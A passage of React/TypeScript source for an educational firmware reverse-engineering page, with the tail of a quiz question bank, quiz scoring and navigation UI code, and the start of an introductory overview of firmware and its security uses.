    options: ["To increase file size", "To identify the exact sample analyzed", "To remove evidence", "To change endianness"],
    correctAnswer: 1,
    explanation: "Hashes uniquely identify the analyzed firmware sample.",
    topic: "Reporting",
  },
  {
    id: 74,
    question: "Why document a timeline of analysis?",
    options: ["To avoid notes", "To improve reproducibility and clarity", "To speed up firmware", "To change permissions"],
    correctAnswer: 1,
    explanation: "Timelines help others reproduce and validate your work.",
    topic: "Reporting",
  },
  {
    id: 75,
    question: "Why only test devices you own or have permission to analyze?",
    options: ["It is faster", "Legal and ethical reasons", "It improves performance", "It changes encryption"],
    correctAnswer: 1,
    explanation: "Authorization is required for ethical and legal testing.",
    topic: "Reporting",
  },
];

function QuizSection() {
  const theme = useTheme();
  const [quizStarted, setQuizStarted] = React.useState(false);
  const [currentQuestions, setCurrentQuestions] = React.useState<QuizQuestion[]>([]);
  const [userAnswers, setUserAnswers] = React.useState<{ [key: number]: number }>({});
  const [showResults, setShowResults] = React.useState(false);
  const [currentQuestionIndex, setCurrentQuestionIndex] = React.useState(0);

  const shuffleAndSelectQuestions = () => {
    const shuffled = [...firmwareQuestionBank].sort(() => Math.random() - 0.5);
    return shuffled.slice(0, 10);
  };

  const startQuiz = () => {
    setCurrentQuestions(shuffleAndSelectQuestions());
    setUserAnswers({});
    setShowResults(false);
    setCurrentQuestionIndex(0);
    setQuizStarted(true);
  };

  const handleAnswerSelect = (questionId: number, answerIndex: number) => {
    setUserAnswers((prev) => ({ ...prev, [questionId]: answerIndex }));
  };

  const calculateScore = () => {
    let correct = 0;
    currentQuestions.forEach((q) => {
      if (userAnswers[q.id] === q.correctAnswer) correct++;
    });
    return correct;
  };

  const getScoreColor = (score: number) => {
    if (score >= 8) return "#22c55e";
    if (score >= 6) return "#f97316";
    return "#ef4444";
  };

  const getScoreMessage = (score: number) => {
    if (score === 10) return "Perfect. Strong firmware reverse engineering fundamentals.";
    if (score >= 8) return "Excellent work. Your fundamentals are solid.";
    if (score >= 6) return "Good progress. Review the core concepts and try again.";
    if (score >= 4) return "Keep going. Revisit the basics and workflow sections.";
    return "Start with the fundamentals and take the quiz again.";
  };

  if (!quizStarted) {
    return (
      <Paper
        id="quiz-section"
        sx={{
          p: 4,
          mb: 5,
          borderRadius: 4,
          bgcolor: alpha(theme.palette.background.paper, 0.6),
          border: `2px solid ${alpha("#06b6d4", 0.3)}`,
          background: `linear-gradient(135deg, ${alpha("#06b6d4", 0.06)} 0%, ${alpha("#8b5cf6", 0.06)} 100%)`,
        }}
      >
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
          <Box
            sx={{
              width: 56,
              height: 56,
              borderRadius: 2,
              background: "linear-gradient(135deg, #06b6d4, #8b5cf6)",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <QuizIcon sx={{ color: "white", fontSize: 32 }} />
          </Box>
          Test Your Knowledge
        </Typography>

        <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8, fontSize: "1.05rem" }}>
          Ready to test what you learned? Take this <strong>10-question quiz</strong> covering firmware reverse
          engineering fundamentals. Questions are randomly selected from a pool of <strong>75 questions</strong>,
          so each attempt is different.
        </Typography>

        <Grid container spacing={2} sx={{ mb: 4 }}>
          <Grid item xs={6} sm={3}>
            <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#06b6d4", 0.12), borderRadius: 2 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, color: "#06b6d4" }}>10</Typography>
              <Typography variant="caption" color="text.secondary">Questions</Typography>
            </Paper>
          </Grid>
          <Grid item xs={6} sm={3}>
            <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#22c55e", 0.12), borderRadius: 2 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, color: "#22c55e" }}>75</Typography>
              <Typography variant="caption" color="text.secondary">Question Pool</Typography>
            </Paper>
          </Grid>
          <Grid item xs={6} sm={3}>
            <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#8b5cf6", 0.12), borderRadius: 2 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, color: "#8b5cf6" }}>8</Typography>
              <Typography variant="caption" color="text.secondary">Topics Covered</Typography>
            </Paper>
          </Grid>
          <Grid item xs={6} sm={3}>
            <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#f97316", 0.12), borderRadius: 2 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, color: "#f97316" }}>Unlimited</Typography>
              <Typography variant="caption" color="text.secondary">Retakes</Typography>
            </Paper>
          </Grid>
        </Grid>

        <Button
          variant="contained"
          size="large"
          onClick={startQuiz}
          startIcon={<QuizIcon />}
          sx={{
            background: "linear-gradient(135deg, #06b6d4, #8b5cf6)",
            fontWeight: 700,
            px: 4,
            py: 1.5,
            fontSize: "1.1rem",
            "&:hover": {
              background: "linear-gradient(135deg, #0891b2, #7c3aed)",
            },
          }}
        >
          Start Quiz
        </Button>
      </Paper>
    );
  }

  if (showResults) {
    const score = calculateScore();
    return (
      <Paper
        id="quiz-section"
        sx={{
          p: 4,
          mb: 5,
          borderRadius: 4,
          bgcolor: alpha(theme.palette.background.paper, 0.6),
          border: `2px solid ${alpha(getScoreColor(score), 0.3)}`,
        }}
      >
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
          <EmojiEventsIcon sx={{ color: getScoreColor(score), fontSize: 40 }} />
          Quiz Results
        </Typography>

        <Box sx={{ textAlign: "center", mb: 4 }}>
          <Typography variant="h1" sx={{ fontWeight: 900, color: getScoreColor(score), mb: 1 }}>
            {score}/10
          </Typography>
          <Typography variant="h6" sx={{ color: "text.secondary", mb: 2 }}>
            {getScoreMessage(score)}
          </Typography>
          <Chip
            label={`${score * 10}%`}
            sx={{
              bgcolor: alpha(getScoreColor(score), 0.15),
              color: getScoreColor(score),
              fontWeight: 700,
              fontSize: "1rem",
              px: 2,
            }}
          />
        </Box>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Review Your Answers:</Typography>

        {currentQuestions.map((q, index) => {
          const isCorrect = userAnswers[q.id] === q.correctAnswer;
          return (
            <Paper
              key={q.id}
              sx={{
                p: 2,
                mb: 2,
                borderRadius: 2,
                bgcolor: alpha(isCorrect ? "#22c55e" : "#ef4444", 0.05),
                border: `1px solid ${alpha(isCorrect ? "#22c55e" : "#ef4444", 0.2)}`,
              }}
            >
              <Box sx={{ display: "flex", alignItems: "flex-start", gap: 1, mb: 1 }}>
                <Chip
                  label={`Q${index + 1}`}
                  size="small"
                  sx={{
                    bgcolor: isCorrect ? "#22c55e" : "#ef4444",
                    color: "white",
                    fontWeight: 700,
                  }}
                />
                <Typography variant="body2" sx={{ fontWeight: 600 }}>
                  {q.question}
                </Typography>
              </Box>
              <Typography variant="body2" sx={{ color: "text.secondary", ml: 4.5 }}>
                <strong>Your answer:</strong> {q.options[userAnswers[q.id]] || "Not answered"}
                {!isCorrect && (
                  <>
                    <br />
                    <strong style={{ color: "#22c55e" }}>Correct:</strong> {q.options[q.correctAnswer]}
                  </>
                )}
              </Typography>
              {!isCorrect && (
                <Alert severity="info" sx={{ mt: 1, ml: 4.5 }}>
                  <Typography variant="caption">{q.explanation}</Typography>
                </Alert>
              )}
            </Paper>
          );
        })}

        <Box sx={{ display: "flex", gap: 2, mt: 3 }}>
          <Button
            variant="contained"
            onClick={startQuiz}
            startIcon={<RefreshIcon />}
            sx={{
              background: "linear-gradient(135deg, #06b6d4, #8b5cf6)",
              fontWeight: 700,
            }}
          >
            Try Again (New Questions)
          </Button>
          <Button
            variant="outlined"
            onClick={() => setQuizStarted(false)}
            sx={{ fontWeight: 600 }}
          >
            Back to Overview
          </Button>
        </Box>
      </Paper>
    );
  }

  const currentQuestion = currentQuestions[currentQuestionIndex];
  const answeredCount = Object.keys(userAnswers).length;

  return (
    <Paper
      id="quiz-section"
      sx={{
        p: 4,
        mb: 5,
        borderRadius: 4,
        bgcolor: alpha(theme.palette.background.paper, 0.6),
        border: `2px solid ${alpha("#06b6d4", 0.3)}`,
      }}
    >
      <Box sx={{ mb: 3 }}>
        <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
          <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>
            Question {currentQuestionIndex + 1} of 10
          </Typography>
          <Chip
            label={currentQuestion.topic}
            size="small"
            sx={{ bgcolor: alpha("#8b5cf6", 0.15), color: "#8b5cf6", fontWeight: 600 }}
          />
        </Box>
        <Box sx={{ width: "100%", bgcolor: alpha("#06b6d4", 0.1), borderRadius: 1, height: 8 }}>
          <Box
            sx={{
              width: `${((currentQuestionIndex + 1) / 10) * 100}%`,
              bgcolor: "#06b6d4",
              borderRadius: 1,
              height: "100%",
              transition: "width 0.3s ease",
            }}
          />
        </Box>
      </Box>

      <Typography variant="h6" sx={{ fontWeight: 700, mb: 3, lineHeight: 1.6 }}>
        {currentQuestion.question}
      </Typography>

      <Grid container spacing={2} sx={{ mb: 4 }}>
        {currentQuestion.options.map((option, index) => {
          const isSelected = userAnswers[currentQuestion.id] === index;
          return (
            <Grid item xs={12} key={index}>
              <Paper
                onClick={() => handleAnswerSelect(currentQuestion.id, index)}
                sx={{
                  p: 2,
                  borderRadius: 2,
                  cursor: "pointer",
                  bgcolor: isSelected ? alpha("#06b6d4", 0.15) : alpha(theme.palette.background.paper, 0.5),
                  border: `2px solid ${isSelected ? "#06b6d4" : alpha(theme.palette.divider, 0.2)}`,
                  transition: "all 0.2s ease",
                  "&:hover": {
                    borderColor: "#06b6d4",
                    bgcolor: alpha("#06b6d4", 0.08),
                  },
                }}
              >
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Box
                    sx={{
                      width: 32,
                      height: 32,
                      borderRadius: "50%",
                      bgcolor: isSelected ? "#06b6d4" : alpha(theme.palette.divider, 0.3),
                      color: isSelected ? "white" : "text.secondary",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      fontWeight: 700,
                      fontSize: "0.9rem",
                    }}
                  >
                    {String.fromCharCode(65 + index)}
                  </Box>
                  <Typography variant="body1" sx={{ fontWeight: isSelected ? 600 : 400 }}>
                    {option}
                  </Typography>
                </Box>
              </Paper>
            </Grid>
          );
        })}
      </Grid>

      <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
        <Button
          variant="outlined"
          disabled={currentQuestionIndex === 0}
          onClick={() => setCurrentQuestionIndex((prev) => prev - 1)}
        >
          Previous
        </Button>

        <Typography variant="body2" color="text.secondary">
          {answeredCount}/10 answered
        </Typography>

        {currentQuestionIndex < 9 ? (
          <Button
            variant="contained"
            onClick={() => setCurrentQuestionIndex((prev) => prev + 1)}
            sx={{
              background: "linear-gradient(135deg, #06b6d4, #8b5cf6)",
            }}
          >
            Next
          </Button>
        ) : (
          <Button
            variant="contained"
            onClick={() => setShowResults(true)}
            disabled={answeredCount < 10}
            sx={{
              background: answeredCount >= 10
                ? "linear-gradient(135deg, #22c55e, #16a34a)"
                : undefined,
              fontWeight: 700,
            }}
          >
            Submit Quiz
          </Button>
        )}
      </Box>

      <Box sx={{ mt: 3, pt: 3, borderTop: `1px solid ${alpha(theme.palette.divider, 0.1)}` }}>
        <Typography variant="caption" color="text.secondary" sx={{ mb: 1, display: "block" }}>
          Quick Navigation:
        </Typography>
        <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
          {currentQuestions.map((_, index) => {
            const isAnswered = userAnswers[currentQuestions[index].id] !== undefined;
            const isCurrent = index === currentQuestionIndex;
            return (
              <Box
                key={index}
                onClick={() => setCurrentQuestionIndex(index)}
                sx={{
                  width: 32,
                  height: 32,
                  borderRadius: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  cursor: "pointer",
                  fontWeight: 700,
                  fontSize: "0.85rem",
                  bgcolor: isCurrent
                    ? "#06b6d4"
                    : isAnswered
                    ? alpha("#22c55e", 0.2)
                    : alpha(theme.palette.divider, 0.1),
                  color: isCurrent ? "white" : isAnswered ? "#22c55e" : "text.secondary",
                  border: `1px solid ${isCurrent ? "#06b6d4" : isAnswered ? "#22c55e" : "transparent"}`,
                  transition: "all 0.2s ease",
                  "&:hover": {
                    bgcolor: isCurrent ? "#06b6d4" : alpha("#06b6d4", 0.2),
                  },
                }}
              >
                {index + 1}
              </Box>
            );
          })}
        </Box>
      </Box>
    </Paper>
  );
}

export default function FirmwareReverseEngineeringPage() {
  const navigate = useNavigate();
  const theme = useTheme();
  const accent = "#06b6d4";

  // Navigation state
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState<string>("");
  const isMobile = useMediaQuery(theme.breakpoints.down("md"));

  const sectionNavItems = [
    { id: "introduction", label: "Introduction", icon: <SchoolIcon /> },
    { id: "firmware-basics-content", label: "Firmware Basics", icon: <StorageIcon /> },
    { id: "hardware-targets-content", label: "Hardware Targets", icon: <DeveloperBoardIcon /> },
    { id: "acquisition-methods-content", label: "Acquisition", icon: <DownloadIcon /> },
    { id: "hardware-interfaces-content", label: "Debug Interfaces", icon: <CableIcon /> },
    { id: "flash-memory-content", label: "Flash Memory", icon: <MemoryIcon /> },
    { id: "filesystem-extraction-content", label: "Filesystem", icon: <FolderOpenIcon /> },
    { id: "binary-analysis-content", label: "Binary Analysis", icon: <CodeIcon /> },
    { id: "emulation-techniques-content", label: "Emulation", icon: <SpeedIcon /> },
    { id: "vulnerability-research-content", label: "Vuln Research", icon: <BugReportIcon /> },
    { id: "bootloader-analysis-content", label: "Bootloader", icon: <SettingsIcon /> },
    { id: "crypto-analysis-content", label: "Crypto Analysis", icon: <LockOpenIcon /> },
    { id: "wireless-protocols-content", label: "Wireless", icon: <WifiIcon /> },
    { id: "modification-patching-content", label: "Modification", icon: <BuildIcon /> },
    { id: "reporting-disclosure-content", label: "Reporting", icon: <DescriptionIcon /> },
    { id: "quiz-section", label: "Quiz", icon: <QuizIcon /> },
  ];

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map((item) => item.id);
      let currentSection = "";

      for (const sectionId of sections) {
        const element = document.getElementById(sectionId);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 150) {
            currentSection = sectionId;
          }
        }
      }
      setActiveSection(currentSection);
    };

    window.addEventListener("scroll", handleScroll);
    handleScroll();
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  const currentIndex = sectionNavItems.findIndex((item) => item.id === activeSection);
  const progressPercent = currentIndex >= 0 ? ((currentIndex + 1) / sectionNavItems.length) * 100 : 0;

  const pageContext = `Firmware Reverse Engineering Learning Guide - Comprehensive course covering firmware basics, hardware targets, acquisition methods, debug interfaces (UART, JTAG, SWD), flash memory extraction, filesystem analysis, binary disassembly, emulation, vulnerability research, bootloader analysis, cryptographic analysis, wireless protocols, firmware modification, and responsible disclosure.`;

  const sidebarNav = (
    <Paper
      elevation={0}
      sx={{
        width: 220,
        flexShrink: 0,
        position: "sticky",
        top: 80,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        borderRadius: 3,
        border: `1px solid ${alpha(accent, 0.15)}`,
        bgcolor: alpha(theme.palette.background.paper, 0.6),
        display: { xs: "none", lg: "block" },
        "&::-webkit-scrollbar": { width: 6 },
        "&::-webkit-scrollbar-thumb": { bgcolor: alpha(accent, 0.3), borderRadius: 3 },
      }}
    >
      <Box sx={{ p: 2 }}>
        <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: accent, display: "flex", alignItems: "center", gap: 1 }}>
          <ListAltIcon sx={{ fontSize: 18 }} />
          Course Navigation
        </Typography>
        <Box sx={{ mb: 2 }}>
          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
            <Typography variant="caption" color="text.secondary">Progress</Typography>
            <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>{Math.round(progressPercent)}%</Typography>
          </Box>
          <LinearProgress variant="determinate" value={progressPercent} sx={{ height: 6, borderRadius: 3, bgcolor: alpha(accent, 0.1), "& .MuiLinearProgress-bar": { bgcolor: accent, borderRadius: 3 } }} />
        </Box>
        <Divider sx={{ mb: 1 }} />
        <List dense sx={{ mx: -1 }}>
          {sectionNavItems.map((item) => (
            <ListItem
              key={item.id}
              onClick={() => scrollToSection(item.id)}
              sx={{
                borderRadius: 1.5, mb: 0.25, py: 0.5, cursor: "pointer",
                bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                "&:hover": { bgcolor: alpha(accent, 0.08) },
                transition: "all 0.15s ease",
              }}
            >
              <ListItemIcon sx={{ minWidth: 24, fontSize: "0.9rem" }}>{item.icon}</ListItemIcon>
              <ListItemText primary={<Typography variant="caption" sx={{ fontWeight: activeSection === item.id ? 700 : 500, color: activeSection === item.id ? accent : "text.secondary", fontSize: "0.75rem" }}>{item.label}</Typography>} />
            </ListItem>
          ))}
        </List>
      </Box>
    </Paper>
  );

  return (
    <LearnPageLayout pageTitle="Firmware Reverse Engineering" pageContext={pageContext}>
      {/* Floating Navigation Button - Mobile Only */}
      <Tooltip title="Navigate Sections" placement="left">
        <Fab color="primary" onClick={() => setNavDrawerOpen(true)} sx={{ position: "fixed", bottom: 90, right: 24, zIndex: 1000, bgcolor: accent, "&:hover": { bgcolor: "#0891b2" }, boxShadow: `0 4px 20px ${alpha(accent, 0.4)}`, display: { xs: "flex", lg: "none" } }}>
          <ListAltIcon />
        </Fab>
      </Tooltip>

      {/* Scroll to Top Button - Mobile Only */}
      <Tooltip title="Scroll to Top" placement="left">
        <Fab size="small" onClick={scrollToTop} sx={{ position: "fixed", bottom: 32, right: 28, zIndex: 1000, bgcolor: alpha(accent, 0.15), color: accent, "&:hover": { bgcolor: alpha(accent, 0.25) }, display: { xs: "flex", lg: "none" } }}>
          <KeyboardArrowUpIcon />
        </Fab>
      </Tooltip>

      {/* Navigation Drawer - Mobile */}
      <Drawer anchor="right" open={navDrawerOpen} onClose={() => setNavDrawerOpen(false)} PaperProps={{ sx: { width: isMobile ? "85%" : 320, bgcolor: theme.palette.background.paper, backgroundImage: "none" } }}>
        <Box sx={{ p: 2 }}>
          <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, display: "flex", alignItems: "center", gap: 1 }}>
              <ListAltIcon sx={{ color: accent }} />
              Course Navigation
            </Typography>
            <IconButton onClick={() => setNavDrawerOpen(false)} size="small"><CloseIcon /></IconButton>
          </Box>
          <Divider sx={{ mb: 2 }} />
          <Box sx={{ mb: 2, p: 1.5, borderRadius: 2, bgcolor: alpha(accent, 0.05) }}>
            <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
              <Typography variant="caption" color="text.secondary">Progress</Typography>
              <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>{Math.round(progressPercent)}%</Typography>
            </Box>
            <LinearProgress variant="determinate" value={progressPercent} sx={{ height: 6, borderRadius: 3, bgcolor: alpha(accent, 0.1), "& .MuiLinearProgress-bar": { bgcolor: accent, borderRadius: 3 } }} />
          </Box>
          <List dense sx={{ mx: -1 }}>
            {sectionNavItems.map((item) => (
              <ListItem key={item.id} onClick={() => scrollToSection(item.id)} sx={{ borderRadius: 2, mb: 0.5, cursor: "pointer", bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent", borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent", "&:hover": { bgcolor: alpha(accent, 0.1) }, transition: "all 0.2s ease" }}>
                <ListItemIcon sx={{ minWidth: 32, fontSize: "1.1rem" }}>{item.icon}</ListItemIcon>
                <ListItemText primary={<Typography variant="body2" sx={{ fontWeight: activeSection === item.id ? 700 : 500, color: activeSection === item.id ? accent : "text.primary" }}>{item.label}</Typography>} />
                {activeSection === item.id && <Chip label="Current" size="small" sx={{ height: 20, fontSize: "0.65rem", bgcolor: alpha(accent, 0.2), color: accent }} />}
              </ListItem>
            ))}
          </List>
          <Divider sx={{ my: 2 }} />
          <Box sx={{ display: "flex", gap: 1 }}>
            <Button size="small" variant="outlined" onClick={scrollToTop} startIcon={<KeyboardArrowUpIcon />} sx={{ flex: 1, borderColor: alpha(accent, 0.3), color: accent }}>Top</Button>
            <Button size="small" variant="outlined" onClick={() => scrollToSection("quiz-section")} startIcon={<QuizIcon />} sx={{ flex: 1, borderColor: alpha(accent, 0.3), color: accent }}>Quiz</Button>
          </Box>
        </Box>
      </Drawer>

      {/* Main Layout with Sidebar */}
      <Box sx={{ display: "flex", gap: 3, maxWidth: 1400, mx: "auto", px: { xs: 2, sm: 3 }, py: 4 }}>
        {sidebarNav}
        <Box sx={{ flex: 1, minWidth: 0 }}>
        {/* Back Button */}
        <Chip
          component={Link}
          to="/learn"
          icon={<ArrowBackIcon />}
          label="Back to Learning Hub"
          clickable
          variant="outlined"
          sx={{ borderRadius: 2, mb: 3 }}
        />

        {/* Hero Banner */}
        <Paper
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 4,
            background: `linear-gradient(135deg, ${alpha("#06b6d4", 0.15)} 0%, ${alpha("#8b5cf6", 0.15)} 50%, ${alpha("#10b981", 0.15)} 100%)`,
            border: `1px solid ${alpha("#06b6d4", 0.2)}`,
            position: "relative",
            overflow: "hidden",
          }}
        >
          {/* Decorative background elements */}
          <Box
            sx={{
              position: "absolute",
              top: -50,
              right: -50,
              width: 200,
              height: 200,
              borderRadius: "50%",
              background: `radial-gradient(circle, ${alpha("#06b6d4", 0.1)} 0%, transparent 70%)`,
            }}
          />
          <Box
            sx={{
              position: "absolute",
              bottom: -30,
              left: "30%",
              width: 150,
              height: 150,
              borderRadius: "50%",
              background: `radial-gradient(circle, ${alpha("#8b5cf6", 0.1)} 0%, transparent 70%)`,
            }}
          />
          
          <Box sx={{ position: "relative", zIndex: 1 }}>
            <Box sx={{ display: "flex", alignItems: "center", gap: 3, mb: 3 }}>
              <Box
                sx={{
                  width: 80,
                  height: 80,
                  borderRadius: 3,
                  background: `linear-gradient(135deg, #06b6d4, #8b5cf6)`,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  boxShadow: `0 8px 32px ${alpha("#06b6d4", 0.3)}`,
                }}
              >
                <DeveloperBoardIcon sx={{ fontSize: 44, color: "white" }} />
              </Box>
              <Box>
                <Typography variant="h3" sx={{ fontWeight: 800, mb: 0.5 }}>
                  Firmware Reverse Engineering
                </Typography>
                <Typography variant="h6" color="text.secondary" sx={{ fontWeight: 400 }}>
                  Unlock the secrets hidden inside embedded devices and IoT hardware
                </Typography>
              </Box>
            </Box>
            
            <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", mb: 3 }}>
              <Chip label="Intermediate to Advanced" color="warning" />
              <Chip label="Hardware Hacking" sx={{ bgcolor: alpha("#f97316", 0.15), color: "#f97316", fontWeight: 600 }} />
              <Chip label="Embedded Systems" sx={{ bgcolor: alpha("#06b6d4", 0.15), color: "#06b6d4", fontWeight: 600 }} />
              <Chip label="IoT Security" sx={{ bgcolor: alpha("#10b981", 0.15), color: "#10b981", fontWeight: 600 }} />
              <Chip label="Reverse Engineering" sx={{ bgcolor: alpha("#8b5cf6", 0.15), color: "#8b5cf6", fontWeight: 600 }} />
            </Box>

            {/* Quick Stats */}
            <Grid container spacing={2}>
              {quickStats.map((stat) => (
                <Grid item xs={6} sm={3} key={stat.label}>
                  <Paper
                    sx={{
                      p: 2,
                      textAlign: "center",
                      borderRadius: 2,
                      bgcolor: alpha(stat.color, 0.1),
                      border: `1px solid ${alpha(stat.color, 0.2)}`,
                    }}
                  >
                    <Typography variant="h4" sx={{ fontWeight: 800, color: stat.color }}>
                      {stat.value}
                    </Typography>
                    <Typography variant="caption" color="text.secondary" sx={{ fontWeight: 600 }}>
                      {stat.label}
                    </Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>
          </Box>
        </Paper>

        {/* Quick Navigation - Sticky */}
        <Paper
          sx={{
            p: 2,
            mb: 4,
            borderRadius: 3,
            position: { xs: "static", md: "sticky" },
            top: { md: 80, xs: "auto" },
            zIndex: 100,
            bgcolor: alpha(theme.palette.background.paper, 0.95),
            backdropFilter: "blur(10px)",
            border: `1px solid ${alpha(theme.palette.divider, 0.15)}`,
            boxShadow: `0 4px 20px ${alpha("#000", 0.1)}`,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 1, flexWrap: "wrap" }}>
            <Chip
              label="⬆ Top"
              component="a"
              href="#"
              onClick={(e: React.MouseEvent) => { e.preventDefault(); window.scrollTo({ top: 0, behavior: "smooth" }); }}
              clickable
              size="small"
              sx={{
                textDecoration: "none",
                bgcolor: alpha("#64748b", 0.15),
                color: "#64748b",
                fontWeight: 700,
                "&:hover": { bgcolor: alpha("#64748b", 0.25) },
              }}
            />
            <Divider orientation="vertical" flexItem sx={{ mx: 0.5 }} />
            {outlineSections.map((section) => (
              <Tooltip key={section.id} title={section.title} arrow placement="top">
                <Chip
                  label={section.title.replace(/^\d+\.\s*/, "").split(" ").slice(0, 2).join(" ")}
                  component="a"
                  href={`#${section.id}-content`}
                  clickable
                  size="small"
                  sx={{
                    textDecoration: "none",
                    bgcolor: alpha(section.color, 0.1),
                    color: section.color,
                    fontWeight: 600,
                    fontSize: "0.7rem",
                    "&:hover": { bgcolor: alpha(section.color, 0.2), transform: "translateY(-1px)" },
                    transition: "all 0.15s ease",
                  }}
                />
              </Tooltip>
            ))}
          </Box>
        </Paper>

        {/* ==================== DETAILED INTRODUCTION ==================== */}
        <Paper
          id="introduction"
          sx={{
            p: 4,
            mb: 5,
            borderRadius: 4,
            bgcolor: alpha(theme.palette.background.paper, 0.6),
            border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <Box
              sx={{
                width: 48,
                height: 48,
                borderRadius: 2,
                background: `linear-gradient(135deg, #06b6d4, #0891b2)`,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <SchoolIcon sx={{ color: "white", fontSize: 28 }} />
            </Box>
            What is Firmware Reverse Engineering?
          </Typography>
          
          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            <strong>Firmware reverse engineering</strong> is the process of analyzing the software that runs on 
            embedded devices—like routers, smart home gadgets, medical equipment, and industrial controllers—to 
            understand how they work, find security vulnerabilities, or unlock hidden features. Think of it as 
            performing surgery on the "brain" of a device: you're extracting and examining the code that tells 
            the hardware what to do.
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            But what exactly is <strong>firmware</strong>? Firmware is a special type of software that's 
            permanently stored on a device's memory chips. Unlike the apps on your phone or programs on your 
            computer that you can easily install and uninstall, firmware is "baked into" the device. It starts 
            running the moment you power on the device and controls everything from how buttons respond to how 
            the device communicates over a network. Your Wi-Fi router, smart TV, fitness tracker, car's 
            infotainment system, and even your microwave all contain firmware.
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            The term comes from being "firm"—somewhere between <strong>hardware</strong> (the physical 
            components you can touch) and <strong>software</strong> (programs that run on an operating system). 
            Firmware is more permanent than regular software but can still be updated, which is why you 
            sometimes see "firmware update" notifications for your devices.
          </Typography>

          <Divider sx={{ my: 4 }} />

          <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
            Why Learn Firmware Reverse Engineering?
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            As our world becomes increasingly connected through the <strong>Internet of Things (IoT)</strong>, 
            billions of embedded devices are being deployed—often with poor security. These devices control 
            critical infrastructure, store sensitive data, and provide entry points into larger networks. 
            Understanding how to analyze firmware is essential for:
          </Typography>

          <Grid container spacing={3} sx={{ mb: 4 }}>
            {[
              {
                title: "Security Research",
                desc: "Finding vulnerabilities in IoT devices before attackers do. Researchers discover hardcoded passwords, buffer overflows, and backdoors in everything from baby monitors to industrial control systems.",
                icon: <SecurityIcon />,
                color: "#ef4444",
              },
              {
                title: "Penetration Testing",
                desc: "Many networks now include embedded devices. Testers need to assess routers, IP cameras, access points, and other IoT devices as potential attack vectors.",
                icon: <BugReportIcon />,
                color: "#f97316",
              },
              {
                title: "Product Development",
                desc: "Engineers analyze competitor products, understand legacy systems without documentation, or debug their own embedded products.",
                icon: <BuildIcon />,
                color: "#10b981",
              },
              {
                title: "Incident Response",
                desc: "When an IoT device is compromised, responders must analyze firmware to understand the attack, identify persistence mechanisms, and remediate the threat.",
                icon: <ScienceIcon />,
                color: "#8b5cf6",
              },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper
                  sx={{
                    p: 3,
                    height: "100%",
                    borderRadius: 3,
                    bgcolor: alpha(item.color, 0.03),
                    border: `1px solid ${alpha(item.color, 0.1)}`,
                  }}
                >
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1.5, mb: 2 }}>
                    <Box sx={{ color: item.color }}>{item.icon}</Box>
                    <Typography variant="h6" sx={{ fontWeight: 700, color: item.color }}>
                      {item.title}
                    </Typography>
                  </Box>
